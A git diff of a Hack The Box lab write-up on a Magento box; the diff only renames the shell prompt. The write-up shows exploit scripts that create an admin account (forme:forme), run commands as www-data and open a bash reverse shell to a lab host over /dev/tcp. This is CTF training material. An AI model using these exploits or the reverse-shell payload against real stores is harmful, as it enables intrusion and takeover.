@@ -59,7 +59,7 @@ Some important guy
 ## foot hold
 from searchsploit I found an interesting exploit `Magento eCommerce - Remote Code Execution`. run `searchsploit -x <script>` to read more about the exploit. which lead us to this [blog](https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) post. We can use this exploit to create a admin user and gain access to Magento admin panel.
 ```
-kali@kali:~/HTB/swag$ python2 37977.py
+bibo318@parrot:~/HTB/swag$ python2 37977.py
 WORKED
 Check http://10.10.10.140/index.php/admin with creds forme:forme
 ```
@@ -73,12 +73,12 @@ after login it and googling the way to gain foothold exploiting Magento. there a
 
 some modification is requried to make the script works. you can google about some error which will occur while you try to run the exloit. HTB community forum, could be help full. Or debugg the code by yourself. make sure that the script is working by running `id` or `whoami`
 ```console
-kali@kali:~/HTB/swag$ python2 37811.py http://10.10.10.140/index.php/admin/ 'whoami'
+bibo318@parrot:~/HTB/swag$ python2 37811.py http://10.10.10.140/index.php/admin/ 'whoami'
 www-data
 ```
 it works, so let's replace it with bash reverse shell payload:
 ```console
-kali@kali:~/HTB/swag$ python2 37811.py http://10.10.10.140/index.php/admin/ 'bash -c "bash -i >& /dev/tcp/10.10.14.43/6969 0>&1"'
+bibo318@parrot:~/HTB/swag$ python2 37811.py http://10.10.10.140/index.php/admin/ 'bash -c "bash -i >& /dev/tcp/10.10.14.43/6969 0>&1"'
 ```
 now go grab user flag.
 
